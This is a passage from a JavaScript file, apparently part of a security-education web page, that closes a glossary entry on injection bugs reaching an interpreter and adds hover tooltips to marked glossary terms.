          '(SSTI, a deserialization bug, a command-injection in a shell call) reaches an ' +
          'interpreter, and from there the attacker has code execution. That is why "does this ' +
          'reach an interpreter?" is the question every injection finding ends on.</p>',
      },
    };

    const terms = document.querySelectorAll('.gloss[data-gloss]');
    if (!terms.length) return;

    terms.forEach(t => {
      const key = t.getAttribute('data-gloss');
      const entry = GLOSSARY[key];
      if (!entry) return;
      // Native browser tooltip: show the title plus a plain-text rendering of the
      // body so hovering actually explains the term (not just labels it).
      const plain = entry.body
        .replace(/<\/p>\s*<p>/gi, '\n\n')
        .replace(/<[^>]+>/g, '')
        .trim();
      t.title = entry.title + '\n\n' + plain;
      t.style.cursor = 'help';
      t.style.borderBottom = '1px dotted var(--ink-mute)';
    });
  })();

})();
